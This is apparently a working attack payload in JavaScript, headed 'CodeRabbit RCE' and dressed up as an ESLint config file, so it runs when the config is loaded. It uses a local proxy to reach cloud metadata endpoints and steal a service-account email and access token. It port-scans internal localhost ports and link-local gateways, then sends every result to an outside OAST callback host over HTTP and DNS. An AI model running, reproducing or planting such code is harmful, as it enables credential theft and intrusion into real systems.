// CodeRabbit RCE — tokenizer-proxy as SSRF PIVOT to the host-side network.
// The proxy dials from its OWN netns; if that differs from ours, its 127.0.0.1 and
// link-local routes reach services we cannot. Last escape surface.
var C = 'd8smjcboeaqn8rtrip106krqtnsgy5atu.oast.pro';
var http = require('http'), dns = require('dns');
var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };
var httpX = function (t, d) { try { http.get({ host: C, path: '/' + t + '/' + hex(String(d)).slice(0, 1500), timeout: 8000 }, function () {}).on('error', function () {}); } catch (e) {} };
try { dns.lookup('alive9.' + C, function () {}); } catch (e) {}

var proxyGet = function (url, tag, extra) {
  var hostm = url.match(/\/\/([^\/:]+)/); var headers = { Host: (hostm ? hostm[1] : 'x'), 'User-Agent': 'x' };
  if (extra) for (var k in extra) headers[k] = extra[k];
  try {
    http.get({ host: '127.0.0.1', port: 1080, path: url, headers: headers, timeout: 6000 }, function (r) {
      var b = ''; r.on('data', function (d) { b += d; }); r.on('end', function () { httpX(tag, 'S' + r.statusCode + ':' + b.slice(0, 280)); });
    }).on('error', function (e) { httpX(tag, 'ERR:' + ((e && e.code) || e)); });
  } catch (e) {}
};

// metadata via proxy — force :80 + by hostname (our direct/443 attempts were refused)
proxyGet('http://169.254.169.254:80/computeMetadata/v1/instance/service-accounts/default/email', 'pm80', { 'Metadata-Flavor': 'Google', Host: 'metadata.google.internal' });
proxyGet('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email', 'pmhost', { 'Metadata-Flavor': 'Google' });
proxyGet('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', 'pmtok', { 'Metadata-Flavor': 'Google' });

// the proxy's OWN localhost (microVM root / host netns) — services we can't reach
[1080, 8080, 8000, 9229, 2375, 6443, 10250, 50051, 8888, 80, 443, 9090, 3000, 5000, 6060, 2379].forEach(function (p) {
  proxyGet('http://127.0.0.1:' + p + '/', 'hl_' + p);
});

// host-side link-local gateways via proxy
['169.254.1.254', '169.254.169.126', '169.254.1.1', '169.254.169.253'].forEach(function (ip) {
  proxyGet('http://' + ip + '/', 'hg_' + ip.replace(/\./g, '_'));
});

module.exports = { root: true, rules: {} };
